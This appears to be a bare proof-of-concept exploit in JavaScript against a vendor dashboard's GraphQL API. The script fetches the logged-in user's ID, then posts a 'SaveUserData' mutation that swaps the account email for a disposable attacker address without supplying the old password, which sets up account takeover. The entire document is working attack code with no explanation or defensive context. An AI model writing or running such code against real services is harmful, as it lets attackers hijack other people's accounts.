userId=0

await fetch("/dashboard/api/userinfo").then(r=>r.json()).then(r=>userId=r.userId)

fetch("https://sandbox-vendors.paddle.com/graphql", {
    "headers": {
        "content-type": "application/json",
    },
    "body": "{\"operationName\":\"SaveUserData\",\"variables\":{\"userId\":1337,\"firstName\":\"zzzz\",\"lastName\":\"xxxs\",\"email\":\"nidayec351@dxirl.com\"},\"query\":\"mutation SaveUserData($userId: Int!, $firstName: String!, $lastName: String!, $email: String!, $previousPassword: String, $newPassword: String, $newPasswordRepeat: String) {\\n  saveUserData(\\n    userId: $userId\\n    firstName: $firstName\\n    lastName: $lastName\\n    email: $email\\n    previousPassword: $previousPassword\\n    newPassword: $newPassword\\n    newPasswordRepeat: $newPasswordRepeat\\n  ) {\\n    success\\n    __typename\\n  }\\n}\"}".replace(1337,userId),
    "method": "POST",
});
